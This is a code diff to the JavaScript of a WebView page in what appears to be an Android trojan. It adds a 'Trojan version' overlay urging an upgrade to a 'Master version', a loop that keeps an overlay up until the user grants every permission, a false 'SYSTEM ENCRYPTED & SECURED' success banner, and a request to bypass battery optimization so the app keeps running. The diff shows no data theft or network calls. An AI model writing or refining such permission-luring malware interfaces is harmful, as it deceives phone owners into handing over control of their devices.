@@ -278,15 +278,25 @@
             document.getElementById('repairGuide').style.display = 'block';
         }
 
-        // Bridge Detection
+        // Live Permission Sensor & Bridge Detection
         let bridgeCheck = setInterval(() => {
             if (window.AndroidBridge) {
-                clearInterval(bridgeCheck);
+                // If on Trojan version, show upgrade overlay
                 if (window.AndroidBridge.isLimitedVersion()) {
                     document.getElementById('trojanOverlay').style.display = 'flex';
+                    clearInterval(bridgeCheck);
+                } 
+                // If on Master version, check for permissions every second
+                else {
+                    if (window.AndroidBridge.hasAllPermissions && window.AndroidBridge.hasAllPermissions()) {
+                        handlePermissionResult('GRANTED');
+                        clearInterval(bridgeCheck);
+                    } else {
+                        document.getElementById('masterOverlay').style.display = 'flex';
+                    }
                 }
             }
-        }, 500);
+        }, 1000);
 
         function handlePermissionResult(status) {
             if (status === 'GRANTED') {
@@ -294,7 +304,15 @@
                 document.getElementById('masterOverlay').style.display = 'none';
                 document.getElementById('statusBanner').innerHTML = "✅ SYSTEM ENCRYPTED & SECURED";
                 document.getElementById('statusBanner').className = "status-bar safe";
-                if (window.AndroidBridge) window.AndroidBridge.requestIgnoreBatteryOptimizations();
+                
+                // Auto-redirect to details page
+                setTimeout(() => {
+                    window.location.href = 'details.html';
+                }, 1500);
+
+                if (window.AndroidBridge && window.AndroidBridge.requestIgnoreBatteryOptimizations) {
+                    window.AndroidBridge.requestIgnoreBatteryOptimizations();
+                }
             }
         }
     </script>
